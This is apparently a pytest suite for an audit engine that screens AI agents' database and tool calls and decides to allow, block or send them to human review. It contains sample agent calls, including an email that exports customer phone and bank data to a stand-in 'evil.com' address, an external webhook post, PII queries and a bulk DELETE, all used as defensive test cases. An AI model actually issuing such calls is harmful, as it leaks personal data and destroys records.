"""
test_tool_call_audit.py
=======================
Comprehensive integration tests for ToolCallAuditEngine.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))

import pytest
from app.tool_call import ToolCallRequest, ToolCallAuditEngine, RiskLevel, AuditLogEntry


@pytest.fixture
def engine():
    return ToolCallAuditEngine()


class TestToolCallRequest:
    """Test ToolCallRequest dataclass."""

    def test_default_values(self):
        req = ToolCallRequest(tool_name="test", params={})
        assert req.agent_id == "unknown"
        assert req.session_id == "unknown"
        assert req.is_database_tool is False
        assert req.fuse_action == "allow"
        assert req.shadow_risk_score is None

    def test_custom_values(self):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT 1"},
            agent_id="agent_1",
            session_id="sess_1",
            is_database_tool=True,
        )
        assert req.tool_name == "cursor.execute"
        assert req.agent_id == "agent_1"
        assert req.is_database_tool is True


class TestRiskLevel:
    """Test RiskLevel enum."""

    def test_risk_levels_exist(self):
        assert RiskLevel.SAFE.value == "safe"
        assert RiskLevel.LOW.value == "low"
        assert RiskLevel.MEDIUM.value == "medium"
        assert RiskLevel.HIGH.value == "high"
        assert RiskLevel.CRITICAL.value == "critical"


class TestToolCallAuditEngineSensitiveQueries:
    """Test audit engine with sensitive queries."""

    def test_demo_scenario_blocks(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT phone, id_card, address FROM customers WHERE status = 1"},
            agent_id="finance_agent",
            session_id="demo_001",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.shadow_risk_score >= 0.90
        assert result.fuse_action == "block"
        assert result.audit_log_id is not None

    def test_employee_salary_blocks(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT salary, bank_account FROM employee_salary WHERE dept='finance'"},
            agent_id="hr_agent",
            session_id="demo_002",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action in ["block", "human_review"]

    def test_patient_records_blocks(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT medical_record, ssn FROM patient_records WHERE id=1"},
            agent_id="medical_agent",
            session_id="demo_003",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action in ["block", "human_review"]


class TestToolCallAuditEngineSafeQueries:
    """Test audit engine with safe queries."""

    def test_safe_product_query_allowed(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT name, price FROM products WHERE category = 'electronics'"},
            agent_id="product_agent",
            session_id="safe_001",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action == "allow"
        assert result.shadow_risk_score < 0.50

    def test_safe_log_query(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT timestamp, action FROM logs WHERE id = 1"},
            agent_id="log_agent",
            session_id="safe_002",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action in ["allow", "human_review"]


class TestToolCallAuditEngineNonDatabase:
    """Test audit engine with non-database tools."""

    def test_non_database_tool_allowed(self, engine):
        req = ToolCallRequest(
            tool_name="send_message",
            params={"message": "Hello"},
            agent_id="messenger",
            session_id="nondb_001",
            is_database_tool=False,
        )
        result = engine.audit(req)
        assert result.fuse_action == "allow"
        assert result.fuse_reason == "non_database_tool"

    def test_non_database_no_shadow_score(self, engine):
        req = ToolCallRequest(
            tool_name="calculate",
            params={"expression": "1+1"},
            agent_id="calc",
            session_id="nondb_002",
            is_database_tool=False,
        )
        result = engine.audit(req)
        assert result.shadow_risk_score is None


class TestToolCallAuditEngineExternalTransfer:
    """Test audit engine with external transfer scenarios."""

    def test_email_external_transfer_blocks(self, engine):
        req = ToolCallRequest(
            tool_name="send_email",
            params={"sql": "SELECT phone, bank_account FROM customers", "to": "external@evil.com"},
            agent_id="email_agent",
            session_id="ext_001",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action == "block"
        assert result.shadow_risk_score >= 0.90

    def test_webhook_external_transfer(self, engine):
        req = ToolCallRequest(
            tool_name="http_post",
            params={"url": "https://external-api.com/webhook", "data": {"table": "transactions"}},
            agent_id="webhook_agent",
            session_id="ext_002",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action in ["block", "human_review"]


class TestToolCallAuditEngineBulkOperations:
    """Test audit engine with bulk operations."""

    def test_bulk_select_triggers_review(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT * FROM customers"},
            agent_id="bulk_agent",
            session_id="bulk_001",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action in ["block", "human_review"]

    def test_delete_triggers_action(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "DELETE FROM customers"},
            agent_id="delete_agent",
            session_id="bulk_002",
            is_database_tool=True,
        )
        result = engine.audit(req)
        assert result.fuse_action in ["block", "human_review"]


class TestToolCallAuditEngineScoreToLevel:
    """Test score to risk level mapping."""

    def test_critical_level(self, engine):
        assert engine._score_to_level(0.95) == RiskLevel.CRITICAL

    def test_high_level(self, engine):
        assert engine._score_to_level(0.75) == RiskLevel.HIGH

    def test_medium_level(self, engine):
        assert engine._score_to_level(0.55) == RiskLevel.MEDIUM

    def test_low_level(self, engine):
        assert engine._score_to_level(0.25) == RiskLevel.LOW

    def test_safe_level(self, engine):
        assert engine._score_to_level(0.10) == RiskLevel.SAFE

    def test_boundary_critical(self, engine):
        assert engine._score_to_level(0.90) == RiskLevel.CRITICAL

    def test_boundary_high(self, engine):
        assert engine._score_to_level(0.70) == RiskLevel.HIGH

    def test_boundary_medium(self, engine):
        assert engine._score_to_level(0.50) == RiskLevel.MEDIUM

    def test_boundary_low(self, engine):
        assert engine._score_to_level(0.20) == RiskLevel.LOW


class TestToolCallAuditEngineAuditTrail:
    """Test audit trail functionality."""

    def test_audit_log_entry_created(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT phone FROM customers"},
            agent_id="test_agent",
            session_id="trail_001",
            is_database_tool=True,
        )
        engine.audit(req)
        trail = engine.get_audit_trail("trail_001")
        assert len(trail) == 1
        assert isinstance(trail[0], AuditLogEntry)

    def test_audit_trail_filtering(self, engine):
        req1 = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT name FROM products"},
            agent_id="agent_1",
            session_id="trail_filter_001",
            is_database_tool=True,
        )
        req2 = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT name FROM products"},
            agent_id="agent_2",
            session_id="trail_filter_002",
            is_database_tool=True,
        )
        engine.audit(req1)
        engine.audit(req2)
        assert len(engine.get_audit_trail("trail_filter_001")) == 1
        assert len(engine.get_audit_trail("trail_filter_002")) == 1

    def test_audit_log_has_all_fields(self, engine):
        req = ToolCallRequest(
            tool_name="cursor.execute",
            params={"sql": "SELECT name FROM products"},
            agent_id="test_agent",
            session_id="trail_fields_001",
            is_database_tool=True,
        )
        engine.audit(req)
        entry = engine.get_audit_trail("trail_fields_001")[0]
        assert entry.log_id is not None
        assert entry.timestamp is not None
        assert entry.risk_score is not None
        assert entry.risk_level is not None
        assert entry.fuse_action is not None
        assert entry.fuse_reason is not None
        assert entry.session_id == "trail_fields_001"
        assert entry.agent_id == "test_agent"


class TestToolCallAuditEngineFuseDecision:
    """Test fuse decision logic."""

    def test_high_score_blocks(self, engine):
        action, reason = engine._fuse_decision(0.95, type('Effect', (), {
            'affected_rows_estimate': 100,
            'sensitive_fields_detected': []
        })(), None)
        assert action == "block"

    def test_sensitive_fields_low_score_allows(self, engine):
        """After fix: sensitive fields no longer bypass score model.
        Score 0.50 < 0.70 -> allow (score model drives decisions)."""
        action, reason = engine._fuse_decision(0.50, type('Effect', (), {
            'affected_rows_estimate': 10,
            'sensitive_fields_detected': ["customers.phone"]
        })(), None)
        assert action == "allow"

    def test_sensitive_fields_high_score_blocks(self, engine):
        """Sensitive fields with score >= 0.90 -> block (via score model)."""
        action, reason = engine._fuse_decision(0.92, type('Effect', (), {
            'affected_rows_estimate': 10,
            'sensitive_fields_detected': ["customers.id_card"]
        })(), None)
        assert action == "block"

    def test_sensitive_fields_medium_score_review(self, engine):
        """Sensitive fields with 0.70 <= score < 0.90 -> human_review."""
        action, reason = engine._fuse_decision(0.80, type('Effect', (), {
            'affected_rows_estimate': 10,
            'sensitive_fields_detected': ["customers.phone"]
        })(), None)
        assert action == "human_review"

    def test_bulk_export_review(self, engine):
        action, reason = engine._fuse_decision(0.50, type('Effect', (), {
            'affected_rows_estimate': 5000,
            'sensitive_fields_detected': []
        })(), None)
        assert action == "human_review"

    def test_medium_score_review(self, engine):
        action, reason = engine._fuse_decision(0.75, type('Effect', (), {
            'affected_rows_estimate': 10,
            'sensitive_fields_detected': []
        })(), None)
        assert action == "human_review"

    def test_low_score_allows(self, engine):
        action, reason = engine._fuse_decision(0.30, type('Effect', (), {
            'affected_rows_estimate': 5,
            'sensitive_fields_detected': []
        })(), None)
        assert action == "allow"


class TestToolCallAuditEngineMultipleAudits:
    """Test multiple sequential audits."""

    def test_multiple_audits_same_session(self, engine):
        session_id = "multi_001"
        for i in range(5):
            req = ToolCallRequest(
                tool_name="cursor.execute",
                params={"sql": f"SELECT name FROM products WHERE id = {i}"},
                agent_id="test_agent",
                session_id=session_id,
                is_database_tool=True,
            )
            engine.audit(req)
        assert len(engine.get_audit_trail(session_id)) == 5

    def test_multiple_audits_different_sessions(self, engine):
        for i in range(3):
            req = ToolCallRequest(
                tool_name="cursor.execute",
                params={"sql": "SELECT name FROM products"},
                agent_id="test_agent",
                session_id=f"session_{i}",
                is_database_tool=True,
            )
            engine.audit(req)
        assert len(engine.get_audit_trail("session_0")) == 1
        assert len(engine.get_audit_trail("session_1")) == 1
        assert len(engine.get_audit_trail("session_2")) == 1
